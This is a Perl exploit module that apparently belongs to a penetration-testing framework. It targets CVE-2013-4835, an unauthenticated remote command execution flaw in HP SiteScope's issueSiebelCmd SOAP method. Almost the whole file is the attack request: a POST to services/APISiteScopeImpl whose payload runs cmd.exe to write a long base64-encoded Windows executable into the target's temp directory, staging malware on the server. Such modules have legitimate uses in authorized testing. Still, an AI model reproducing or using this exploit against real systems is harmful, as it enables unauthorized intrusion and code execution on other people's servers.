package HP::MSF::HpSitescopeIssuesiebelcmd;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "HpSitescopeIssuesiebelcmd";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-4835",
  DESCRIPTION => "

        This module exploits a code execution flaw in HP SiteScope. The vulnerability exists in the

        APISiteScopeImpl web service, specifically in the issueSiebelCmd method, which allows the

        user to execute arbitrary commands without authentication. This module has been tested

        successfully on HP SiteScope 11.20 over Windows 2003 SP2, Windows 2008 and CentOS 6.5.

      ",
  MSF_MODULE => "hp_sitescope_issuesiebelcmd",
  OSVDB => 99230,
  PATHS => ["SiteScope/"],
  TITLE => "HP SiteScope issueSiebelCmd Remote Code Execution",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Path to SiteScope", VALUE => "/SiteScope/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'services/APISiteScopeImpl',
      PAYLOAD      => '<soapenv:Envelope xmlns:api=\'http://Api.freshtech.COM\' xmlns:soapenv=\'http://schemas.xmlsoap.org/soap/envelope/\' xmlns:xsd=\'http://www.w3.org/2001/XMLSchema\' xmlns:xsi=\'http://www.w3.org/2001/XMLSchema-instance\'><soapenv:Header/><soapenv:Body><api:issueSiebelCmd soapenv:encodingStyle=\'http://schemas.xmlsoap.org/soap/encoding/\'><in0 xsi:type=\'xsd:string\'>cmd.exe /c echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACTOPDW11mehddZnoXXWZ6FrEWShdNZnoVURZCF3lmehbhGlIXcWZ6FuEaahdRZnoXXWZ+FHlmehVRRw4XfWZ6Fg3quhf9ZnoUQX5iF1lmehVJpY2jXWZ6FAAAAAAAAAAAAAAAAAAAAAFBFAABMAQQAy/MySgAAAAAAAAAA4AAPAQsBBgAAsAAAAKAAAAAAAAA9RAAAABAAAADAAAAAAEAAABAAAAAQAAAEAAAAAAAAAAQAAAAAAAAAAGABAAAQAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAbMcAAHgAAAAAUAEAyAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAODBAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAADgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABmqQAAABAAAACwAAAAEAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAA5g8AAADAAAAAEAAAAMAAAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAFxwAAAA0AAAAEAAAADQAAAAAAAAAAAAAAAAAABAAADALnJzcmMAAADIBwAAAFABAAAQAAAAEAEAAAAAAAAAAAAAAAAAQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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>>%TEMP%\eQvjk.b64 &#x26; /u LYLw /p HCdV</in0></api:issueSiebelCmd></soapenv:Body></soapenv:Envelope>',
      TEXT   => 'Sending Exploit #1 Request : [POST] /services/APISiteScopeImpl',
      HEADERS      => {
        'SOAPAction' => '""',
        'Content-Type' => 'text/xml; charset=UTF-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
